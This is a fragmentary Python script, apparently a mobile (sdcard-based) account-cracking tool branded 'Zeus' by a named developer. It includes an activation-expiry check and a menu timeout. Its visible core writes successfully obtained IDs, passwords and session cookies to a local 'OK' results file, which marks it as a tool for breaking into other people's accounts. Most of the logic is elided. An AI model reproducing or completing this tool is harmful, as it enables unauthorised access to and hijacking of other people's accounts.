...
EXPIRY_DATE = datetime(2026, 8, 17)  # التاريخ المحدد لانتهاء التفعيل
EXIT_MESSAGE = "\n تم انتهاء التفعيل | @R7_36 Zeus \n"
...
def check_expiry():
    ...
    if now >= EXPIRY_DATE:
        print(EXIT_MESSAGE)
        sys.exit(0)
    # إذا كان التاريخ أقل من تاريخ الانتهاء، نسمح بالتشغيل
...
DEV :: @R7_36 ~ Zeus
 ...
 ــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــ"""
                    ...
                    try:
                        ...
                        open('/sdcard/Zeus-/FILE/PS-M1-OK.txt', 'a').write(ids + '/' + pas + '/' + cookie + '\n')
                    except:
                        pass
                    self.oks.append(ids)
                    break
...
def main_menu():
    # مؤقت 60 ثانية
    timeout_thread = threading.Timer(TIMEOUT, lambda: sys.exit(EXIT_MESSAGE))
